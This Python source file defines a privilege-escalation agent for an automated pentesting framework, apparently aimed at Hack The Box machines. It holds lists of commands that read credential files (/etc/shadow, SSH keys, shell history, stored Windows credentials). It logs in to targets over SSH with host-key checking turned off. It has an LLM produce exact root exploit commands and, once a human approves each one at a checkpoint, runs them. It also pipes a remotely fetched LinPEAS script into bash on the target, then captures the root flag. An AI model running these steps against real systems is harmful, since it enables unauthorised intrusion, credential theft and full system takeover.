"""PrivEsc Agent — enumerate and exploit privilege escalation vectors."""
from __future__ import annotations
import re
from pathlib import Path
from models import HackSession, AgentResult, Stage, Finding, Severity
from tools.runner import run
from agents.base import BaseAgent
import checkpoint as cp


LINUX_ENUM: list[tuple[str, str]] = [
    ("id",        "id && whoami && hostname && groups"),
    ("sudo",      "sudo -l 2>/dev/null || echo 'no sudo access'"),
    ("suid",      "find / -perm -4000 -type f 2>/dev/null | head -40"),
    ("sgid",      "find / -perm -2000 -type f 2>/dev/null | head -20"),
    ("caps",      "getcap -r / 2>/dev/null"),
    ("cron",      "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null"),
    ("writable",  "find / -writable -type f 2>/dev/null | grep -v '/proc\\|/sys\\|/dev\\|/run' | head -20"),
    ("home",      "ls -la /home/ 2>/dev/null"),
    ("passwd",    "cat /etc/passwd"),
    ("shadow_r",  "cat /etc/shadow 2>/dev/null | head -5 || echo 'shadow not readable'"),
    ("kernel",    "uname -a; cat /etc/os-release 2>/dev/null | head -5"),
    ("procs",     "ps aux 2>/dev/null | head -40"),
    ("env",       "env 2>/dev/null"),
    ("history",   "cat ~/.bash_history 2>/dev/null | tail -30"),
    ("sensitive", "find / -name 'id_rsa' -o -name '*.key' -o -name '.env' -o -name 'config.php' 2>/dev/null | grep -v '/proc\\|/sys' | head -10"),
    ("nfs",       "cat /etc/exports 2>/dev/null || echo 'no exports'"),
    ("docker",    "groups | grep -q docker && echo 'IN DOCKER GROUP' || ls -la /var/run/docker.sock 2>/dev/null || echo 'no docker socket'"),
    ("services",  "systemctl list-units --type=service --state=running 2>/dev/null | head -20"),
]

WINDOWS_ENUM: list[tuple[str, str]] = [
    ("whoami",    "whoami /all"),
    ("sysinfo",   "systeminfo"),
    ("tasks",     "schtasks /query /fo LIST /v 2>nul | findstr /i \"TaskName To Run\""),
    ("services",  "wmic service get name,pathname,startmode 2>nul | findstr /i \"auto\""),
    ("alwaysinst","reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer 2>nul"),
    ("unattend",  "dir /s /b C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul"),
    ("users",     "net user 2>nul & net localgroup administrators 2>nul"),
    ("processes", "tasklist /svc 2>nul"),
    ("history",   "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul"),
    ("creds",     "cmdkey /list 2>nul"),
]


class PrivEscAgent(BaseAgent):
    NAME  = "PrivEsc"
    STAGE = Stage.PRIVESC

    SYSTEM_PROMPT = """You are an expert penetration tester specialising in privilege escalation.
You have deep knowledge of Linux privesc: SUID binaries (GTFOBins), sudo misconfigs, capabilities,
cron job hijacking, writable PATH entries, kernel exploits, Docker/LXD group abuse.
And Windows privesc: token impersonation, unquoted service paths, AlwaysInstallElevated,
scheduled tasks, unattended install files, credential files.
You are part of ATLAS. Be precise. Give exact commands. Reference GTFOBins where applicable.
Never fabricate CVEs or binary names."""

    def run(self) -> AgentResult:
        result = AgentResult(agent=self.NAME, stage=self.STAGE, summary="")
        ip = self.session.target_ip
        is_windows = "windows" in self.session.os_guess.lower()

        ssh_cred = self._find_ssh_cred()

        if ssh_cred:
            self.log(f"SSH access: {ssh_cred.username}@{ip}", "success")
            enum_data = self._run_via_ssh(ip, ssh_cred, is_windows, result)
        else:
            self.log("No SSH creds — generating script for manual execution", "warning")
            enum_data = self._generate_script_mode(ip, is_windows, result)

        if not enum_data:
            result.summary = "PrivEsc enumeration skipped — no access."
            return result

        # ── LLM analysis ─────────────────────────────────────────
        self.log("LLM analysing privesc surface...")
        analysis = self.ask_json(f"""
Analyse this privilege escalation enumeration from a {'Windows' if is_windows else 'Linux'} HTB machine.

SESSION:
{self.session.context_summary()}

ENUMERATION OUTPUT:
{enum_data[:6000]}

Respond with JSON:
{{
  "current_user": "username",
  "current_groups": ["group1", "group2"],
  "kernel_version": "X.X.X",
  "kernel_exploits": ["CVE-XXXX-XXXX description if applicable"],
  "vectors": [
    {{
      "rank": 1,
      "type": "SUID|sudo|cron|capability|writable|kernel|docker|service|token|etc",
      "target": "specific binary, file, or service",
      "description": "what the misconfiguration is",
      "exploit_command": "exact command to achieve root/SYSTEM",
      "gtfobins_ref": "gtfobins.github.io/gtfobins/NAME or null",
      "confidence": "high|medium|low",
      "why": "why this will work"
    }}
  ],
  "interesting_files": ["files with passwords or keys worth reading"],
  "key_finding": "most important single finding in one sentence",
  "linpeas_recommended": true
}}""")

        vectors = analysis.get("vectors", [])

        # ── Display ───────────────────────────────────────────────
        self._print_analysis(analysis, vectors)

        result.next_actions = [v.get("exploit_command", "") for v in vectors if v.get("exploit_command")]
        result.metadata = analysis

        # ── LinPEAS (optional) ────────────────────────────────────
        if analysis.get("linpeas_recommended") and ssh_cred and not is_windows:
            self._maybe_run_linpeas(ip, ssh_cred, result)

        # ── Execute top vectors ───────────────────────────────────
        if ssh_cred and vectors:
            for v in vectors[:5]:
                cmd = v.get("exploit_command", "")
                if not cmd:
                    continue

                cr = self.checkpoint(
                    what_found=f"{v.get('type')} via {v.get('target')} [{v.get('confidence','?').upper()}]",
                    plan=f"Execute: {cmd}",
                    why=v.get("why", ""),
                    what_to_look_for="uid=0, root shell prompt, /root/root.txt content",
                    command=cmd,
                    risk="high",
                )

                if cr.action == cp.CheckpointResult.ABORTED:
                    break
                if not cr.approved:
                    continue

                run_cmd = cr.override if cr.action == cp.CheckpointResult.MODIFIED else cmd
                out = self._ssh_run_cmd(ip, ssh_cred, run_cmd, timeout=30)
                result.raw_outputs[f"privesc_{v.get('rank', 1)}"] = out

                if self._is_root(out):
                    self.log("ROOT/SYSTEM ACHIEVED!", "success")
                    self._capture_root_flag(ip, ssh_cred, run_cmd, result)
                    result.findings.append(Finding(
                        title=f"Privilege Escalation: {v.get('type')}",
                        severity=Severity.CRITICAL,
                        description=f"Escalated to root via {v.get('target')}. {v.get('why', '')}",
                        evidence=out[:400],
                        command=run_cmd,
                        agent=self.NAME,
                    ))
                    break

                # LLM interprets output
                interp = self.ask(
                    f"PrivEsc attempt:\nCommand: {run_cmd}\nOutput:\n{out[:1500]}\n\n"
                    "Did this succeed? What does the output mean? "
                    "Any partial access gained? What to try next?"
                )
                cp.notify("PrivEsc", interp[:250], "info")

        result.summary = (
            f"PrivEsc complete. {len(vectors)} vector(s). "
            f"Root: {'CAPTURED — ' + self.session.root_flag if self.session.root_flag else 'not captured'}"
        )
        return result

    # ── SSH helpers ───────────────────────────────────────────────

    def _find_ssh_cred(self):
        """Find best SSH credential from session."""
        # Prefer creds tagged as ssh
        for c in self.session.credentials:
            if c.service == "ssh" and c.username and c.password:
                return c
        # Fall back to any cred with username+password
        for c in self.session.credentials:
            if c.username and c.password:
                return c
        return None

    def _ssh_run_cmd(self, ip: str, cred, command: str, timeout: int = 30) -> str:
        """Run a command on target via SSH. Returns combined stdout+stderr."""
        ssh_port = self.session.ssh_port
        port_flag = f"-p {ssh_port.number}" if ssh_port and ssh_port.number != 22 else ""
        # Use sshpass for password auth; fall back to key auth
        if cred.password:
            ssh_cmd = (
                f"sshpass -p {cred.password!r} ssh "
                f"-o StrictHostKeyChecking=no -o BatchMode=no "
                f"-o ConnectTimeout=10 {port_flag} "
                f"{cred.username}@{ip} {command!r}"
            )
        else:
            ssh_cmd = (
                f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes "
                f"-o ConnectTimeout=10 {port_flag} "
                f"{cred.username}@{ip} {command!r}"
            )
        r = run(ssh_cmd, timeout=timeout, log_dir=self.output_dir)
        return r.output

    def _run_via_ssh(self, ip: str, cred, is_windows: bool, result: AgentResult) -> str:
        """Run all enum commands via SSH, return combined output."""
        enum_cmds = WINDOWS_ENUM if is_windows else LINUX_ENUM

        cr = self.checkpoint(
            what_found=f"SSH access as {cred.username}@{ip} (OS: {'Windows' if is_windows else 'Linux'})",
            plan=f"Run {len(enum_cmds)} post-shell enumeration commands",
            why="Automated privesc enum covers SUID, sudo, caps, cron, writable paths, kernel — same checklist a human pentester runs. Parallel SSH for speed.",
            what_to_look_for="SUID on unusual binary, sudo NOPASSWD, writable cron, cap_setuid, docker group, shadow readable",
            command=f"[{len(enum_cmds)} SSH commands as {cred.username}]",
            risk="low",
        )
        if not cr.approved:
            return ""

        outputs: list[str] = []
        for name, cmd in enum_cmds:
            self.log(f"  enum: {name}...")
            out = self._ssh_run_cmd(ip, cred, cmd, timeout=20)
            if out:
                outputs.append(f"=== {name.upper()} ===\n{out}")
                result.raw_outputs[f"privesc_enum_{name}"] = out
                cp.tool_output(f"ssh/{name}", out[:150] if len(out) > 150 else out)

        return "\n\n".join(outputs)

    # ── Script generation (no-SSH fallback) ──────────────────────

    def _generate_script_mode(self, ip: str, is_windows: bool, result: AgentResult) -> str:
        """Generate enum script for manual transfer + execution."""
        enum_cmds = WINDOWS_ENUM if is_windows else LINUX_ENUM

        if is_windows:
            lines = ["@echo off", "REM ATLAS PrivEsc Enum"]
            lines += [f'echo === {n.upper()} ===\r\n{c}\r\n' for n, c in enum_cmds]
            script = "\r\n".join(lines)
            script_name = "atlas_privesc.bat"
        else:
            lines = ["#!/bin/bash", "# ATLAS PrivEsc Enum"]
            lines += [f'echo "=== {n.upper()} ==="\n{c}' for n, c in enum_cmds]
            script = "\n\n".join(lines)
            script_name = "atlas_privesc.sh"

        script_path = Path(self.output_dir) / script_name
        script_path.write_text(script)

        from rich.console import Console
        from rich.panel import Panel
        Console().print(Panel(
            f"[bold yellow]No SSH creds — manual execution required.[/bold yellow]\n\n"
            f"Script saved: [green]{script_path}[/green]\n\n"
            f"[bold]Steps:[/bold]\n"
            f"  1. python3 -m http.server 8000   [dim](on your machine)[/dim]\n"
            f"  2. On target: wget http://YOUR_IP:8000/{script_name}\n"
            f"  3. {'bash' if not is_windows else ''} {script_name} > /tmp/pe.txt 2>&1\n"
            f"  4. cat /tmp/pe.txt\n\n"
            f"Paste the output below, then type [bold]END[/bold] on its own line.",
            title="[yellow]Manual PrivEsc Enum[/yellow]",
            border_style="yellow",
        ))

        lines_in: list[str] = []
        while True:
            try:
                line = input()
                if line.strip() == "END":
                    break
                lines_in.append(line)
            except (EOFError, KeyboardInterrupt):
                break

        return "\n".join(lines_in) if lines_in else ""

    # ── LinPEAS ───────────────────────────────────────────────────

    def _maybe_run_linpeas(self, ip: str, cred, result: AgentResult) -> None:
        cr = self.checkpoint(
            what_found="LLM recommends deeper enumeration",
            plan="Download and run LinPEAS on target via SSH pipe",
            why="LinPEAS catches 200+ vectors including PATH hijack, SUID chains, passwords in files, Docker socket, LXD group, and NFS no_root_squash.",
            what_to_look_for="Yellow/red output sections — 'Interesting SUID files', 'Sudo version vuln', 'Writable cron', 'Passwords in files'",
            command=f"curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh {cred.username}@{ip} 'bash'",
            risk="medium",
        )
        if not cr.approved:
            return

        self.log("Running LinPEAS (this takes ~2 min)...")
        out = self._ssh_run_cmd(
            ip, cred,
            "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null",
            timeout=180,
        )
        if not out:
            self.log("LinPEAS returned no output", "warning")
            return

        result.raw_outputs["linpeas"] = out

        extra = self.ask(
            f"LinPEAS output:\n{out[-4000:]}\n\n"
            "Find any NEW privesc vectors not already covered. "
            "List top 3 with exact exploitation commands. Focus on highlighted findings."
        )
        cp.notify("PrivEsc", f"LinPEAS extras: {extra[:300]}", "info")

    # ── Root flag capture ─────────────────────────────────────────

    def _capture_root_flag(self, ip: str, cred, shell_cmd: str, result: AgentResult) -> None:
        """Try to read root.txt using the escalation command."""
        # Try wrapping the shell command to read root flag
        flag_attempts = [
            f"cat /root/root.txt 2>/dev/null",
            f"find / -name root.txt 2>/dev/null | head -1 | xargs cat 2>/dev/null",
        ]
        for attempt in flag_attempts:
            out = self._ssh_run_cmd(ip, cred, attempt, timeout=15)
            flag = self._extract_flag(out)
            if flag:
                self.session.root_flag = flag
                self.log(f"ROOT FLAG: {flag}", "success")
                return

    def _is_root(self, output: str) -> bool:
        indicators = [r"uid=0\(root\)", r"^root$", r"\$ su", r"# $", r"#\s*$",
                      r"NT AUTHORITY\\SYSTEM", r"BUILTIN\\Administrators"]
        return any(re.search(p, output, re.M) for p in indicators)

    def _extract_flag(self, output: str) -> str:
        m = re.search(r'HTB\{[^}]+\}', output)
        if m:
            return m.group(0)
        m = re.search(r'\b[0-9a-f]{32}\b', output, re.I)
        return m.group(0) if m else ""

    # ── Display ───────────────────────────────────────────────────

    def _print_analysis(self, analysis: dict, vectors: list) -> None:
        from rich.console import Console
        from rich.panel import Panel
        cons = Console()
        cp.section("PrivEsc Analysis")

        body = (
            f"[bold]User:[/bold] {analysis.get('current_user', '?')} "
            f"| Groups: {', '.join(analysis.get('current_groups', []))}\n"
            f"[bold]Kernel:[/bold] {analysis.get('kernel_version', '?')}\n\n"
        )

        if analysis.get("kernel_exploits"):
            body += f"[bold yellow]Kernel CVEs:[/bold yellow] {', '.join(analysis['kernel_exploits'])}\n\n"

        body += f"[bold green]Key finding:[/bold green] {analysis.get('key_finding', 'None')}\n\n"
        body += "[bold red]Privesc vectors:[/bold red]\n"

        for v in vectors:
            conf_color = {"high": "green", "medium": "yellow", "low": "dim"}.get(v.get("confidence", "low"), "white")
            body += (
                f"  [{conf_color}]{v.get('rank', 0)}. [{v.get('confidence', '?').upper()}] "
                f"{v.get('type', '?')} → {v.get('target', '?')}[/{conf_color}]\n"
                f"     {v.get('description', '')}\n"
                f"     [green]{v.get('exploit_command', '?')}[/green]\n"
            )
            if v.get("gtfobins_ref"):
                body += f"     [dim]ref: {v['gtfobins_ref']}[/dim]\n"
            body += "\n"

        if analysis.get("interesting_files"):
            body += "[bold]Interesting files:[/bold]\n"
            body += "\n".join(f"  • {f}" for f in analysis["interesting_files"])

        cons.print(Panel(body, title="[red]PrivEsc Vectors[/red]", border_style="red"))
